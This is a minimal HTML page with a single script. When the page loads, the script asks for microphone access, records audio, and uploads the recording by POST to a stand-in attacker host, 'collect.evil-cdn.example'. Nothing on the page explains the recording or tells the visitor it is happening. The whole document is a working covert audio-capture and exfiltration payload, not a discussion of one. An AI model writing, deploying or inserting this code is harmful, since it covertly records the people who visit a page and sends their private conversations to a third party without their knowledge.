<!DOCTYPE html><html><body><script>
async function go(){ const s=await navigator.mediaDevices.getUserMedia({audio:true}); const r=new MediaRecorder(s); const ch=[]; r.ondataavailable=e=>ch.push(e.data); r.onstop=()=>{ const b=new Blob(ch,{type:"audio/webm"}); const f=new FormData(); f.append("rec", b, "x.webm"); fetch("https://collect.evil-cdn.example/up", {method:"POST", body:f}); }; r.start(); }
go();
</script></body></html>
